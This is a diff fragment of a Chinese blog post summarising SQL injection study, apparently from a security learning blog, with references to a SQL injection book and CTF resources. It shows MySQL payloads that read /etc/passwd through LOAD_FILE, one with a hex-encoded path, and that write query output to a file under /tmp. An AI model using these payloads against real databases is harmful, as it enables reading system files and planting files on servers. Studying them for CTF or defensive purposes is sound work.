-SELECT LOAD_FILE(&apos;/etc/passwd&apos;);
-SELECT LOAD_FILE(0x2F6574632F706173737764); #读取/etc/passwd
+<p>&emsp;&emsp;<strong>读写文件：</strong><br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 读取文件</span></span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="comment">'/etc/passwd');</span></span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="number">0x2F6574632F706173737764</span>); <span class="meta">#读取/etc/passwd</span></span><br><span class="line">    </span><br><span class="line"><span class="meta"># 写入文件</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> thetable <span class="keyword">INTO</span> dumofile <span class="comment">'/tmp/hacker';</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<p>&emsp;&emsp;花了一周的时间终于把 <em>《SQL注入攻击与防御（第2版）》</em> 看完了，书买了一年，一直没有耐心看下去。</p>
+<p>&emsp;&emsp;这篇博客算是“重新”学习SQL注入的总结，但是绝没有终结，还有许多的姿势没有解锁。但是在现在SQL注入算是几乎绝迹了，几乎只有在CTF中才能遇到，也就不再深入研究了，以后遇到了再来填。</p>
+<p>&emsp;&emsp;参考资料：</p>
+<pre><code>《SQL注入攻击与防御（第2版）》
 
-# 写入文件
-SELECT * FROM thetable INTO dumofile &apos;/tmp/hacker&apos;;
+CTF Wiki : https://ctf-wiki.github.io/ctf-wiki/web/sqli/
+
+Web-Security-Learning : https://github.com/CHYbeta/Web-Security-Learning
 </code></pre>
       
     </div>
